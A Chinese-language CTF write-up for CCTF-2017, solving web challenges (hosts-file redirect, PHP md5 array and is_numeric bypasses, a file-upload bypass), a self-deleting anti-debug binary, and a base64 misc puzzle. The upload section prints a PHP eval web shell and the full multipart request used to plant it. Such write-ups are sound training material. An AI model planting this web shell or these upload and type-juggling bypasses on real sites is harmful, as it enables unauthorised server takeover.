# CCTF-2017(纪念众大佬指导我，第一次打CTF这么欢乐)
## 签到题目(50 分)
http://116.62.63.190/01b2962787ccc75f/web1/

在burp中 Ctrl+R看到一个302，然后有两个IP地址，然后修改`/etc/hosts`加上
```
110.80.134.152 www.nsfocus.com
121.195.115.82 www.nsfocus.com
```
即可得到
```
HTTP/1.1 302 Found
Date: Thu, 20 Jul 2017 15:46:46 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://www.nsfocus.com
Content-Length: 42
Connection: close
Content-Type: text/html; charset=UTF-8


flag{660b7b8c06e3150d174a3ec9fcd7ab9d}
```

## 3(150 分)
http://116.62.63.190/82d66810aa826365/web3/

![](img/Screenshot_2017-07-20_上午11.50.50.png)
开始还用万能密码`'or 1=1`测试各个字段，然后发现都没有注入，后来大佬提示我说，看源码啊，对啊，傻逼啊。
看源码发现，
![](img/Screenshot_2017-07-20_上午11.35.40.png)
大概意思是，`login`字段必须有，然后`user`字段不用管，然后`name`和`password`字段的值必须有，但是不能相等。然后但是他们的md5必须相等。然后大佬提示我说，看之前发的文章啊，用数组就可以绕过。于是`name[]=1&password[]=1`，然后看到后面的`is_numeric($_POST['id'])`说明`id`参数必须是一个数字，然后`$_POST['id']!==72`然后preg_match('/\s/', $_POST['id'])说明，这个id的值里面不能含有空字符。然后进入里面的if判断，又有`if($_POST['id'==72])`才行。我们想啊想，怎么绕过呢，大佬们先用python试了试8进制`oct(72)`和16进制`hex(72)`都不行，然后后来听一个大佬说，加0吧，改成`072`然后成功绕过。
![](img/Screenshot_2017-07-20_上午11.29.54.png)
## 4(300 分)
http://116.62.63.190/85e34e2e3319ab7d/web4/
这是一道上传题。又是大神坐我旁边指导我。
首先要解决的问题是要能上传文本，然后各种改文件名，后来用的`双文件上传`
搜php的webshell变形，发现这个地址
https://github.com/tennc/webshell/blob/master/caidao-shell/%E5%BC%BA%E6%82%8D.php
用
```
<script language="php">@eval_r($_POST[sb])</script>
//绕过<?限制的一句话
```
成功绕过
完整请求如下：
```
POST /85e34e2e3319ab7d/web4/ HTTP/1.1
Host: 116.62.63.190
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data; boundary=---------------------------605564244793245775503259849
Content-Length: 681
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------605564244793245775503259849
Content-Disposition: form-data; name="file"; filename="abcaa.php .p;a.php"
Content-Type: image/jpeg

< phpinfo();
-----------------------------605564244793245775503259849--
Content-Type: multipart/form-data; boundary=---------------------------605564244793245775503259849
Content-Length: 243
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------605564244793245775503259849
Content-Disposition: form-data; name="file"; filename="suowqiqwea.php.a"
Content-Type: image/jpeg

<script language="php">@eval_r($_POST[sb])</script>
-----------------------------605564244793245775503259849--
```
这里还看大佬使用了`0x00`截断，
然后响应为：
![](img/Screenshot_2017-07-21_上午12.23.38.png)
上传成功之后，打开这个页面，即可得到flag。
`116.62.63.190/85e34e2e3319ab7d/web4/upload/suowqiqwea.php.a`
![](img/Screenshot_2017-07-20_上午11.29.54.png)


# RE
## 我也不知道哈哈(80 分)
我靠！扔到kali里面ltrace/strace一下就崩了。vmware就崩了，耗尽CPU?
![](img/Screenshot_2017-07-21_上午1.04.03.png)
用ltrace
```
root@kali:~/test/bin# ltrace ./re.bbc3f25e1874c67da76b458ed71b3b1a
__libc_start_main(0x400a0e, 1, 0x7ffead5992a8, 0x400aa0 <unfinished ...>
readlink(0x400b24, 0x7ffead598f60, 512, 0)                      = 50
ptrace(0, 0, 1, 0)                                              = -1
remove("/root/test/bin/re.bbc3f25e1874c6"...)                   = 0
system("halt"Connection to 192.168.170.144 closed by remote host.
Connection to 192.168.170.144 closed.
```
用strace呢
```
root@kali:~/test/bin# strace ./re.bbc3f25e1874c67da76b458ed71b3b1a
execve("./re.bbc3f25e1874c67da76b458ed71b3b1a", ["./re.bbc3f25e1874c67da76b458ed71"...], [/* 20 vars */]) = 0
brk(NULL)                               = 0xe8b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7066f6e000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=127208, ...}) = 0
mmap(NULL, 127208, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7066f4e000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\320\3\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1685264, ...}) = 0
mmap(NULL, 3791264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f70669b0000
mprotect(0x7f7066b45000, 2093056, PROT_NONE) = 0
mmap(0x7f7066d44000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x194000) = 0x7f7066d44000
mmap(0x7f7066d4a000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7066d4a000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7066f4c000
arch_prctl(ARCH_SET_FS, 0x7f7066f4c700) = 0
mprotect(0x7f7066d44000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7f7066f71000, 4096, PROT_READ) = 0
munmap(0x7f7066f4e000, 127208)          = 0
readlink("/proc/self/exe", "/root/test/bin/re.bbc3f25e1874c6"..., 512) = 50
ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)
unlink("/root/test/bin/re.bbc3f25e1874c67da76b458ed71b3b1a") = 0
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f70669e3040}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f70669e3040}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0x7ffe16fe33dc) = 1287
wait4(1287, Connection to 192.168.170.144 closed by remote host.
Connection to 192.168.170.144 closed.
```
然鹅，扔到hopper里面string就出来了
![](img/Screenshot_2017-07-21_上午1.17.09.png)


# MISC
```
[master][~/CTF/CCTF-2017/MISC]$ strings -n 10 kungfu.rar                                       [1:38:30]
LEd}#2)!3e
\Z_/cOa]Wq
LaFHL"S;wc
YyBxf8\f"(
7P3y]~|LQK
5rr5z.1U-z
cPUS%"N1vQK
ZkI,X6q]hS
x||,Czyyy}}
dAof&N0^#'
key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg
[master][~/CTF/CCTF-2017/MISC]$ echo "VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg"|base64 -D          [1:38:39]
T_ysK9_5rhk__uFMt}3El{nu@E %                                                                             [master][~/CTF/CCTF-2017/MISC]$
```
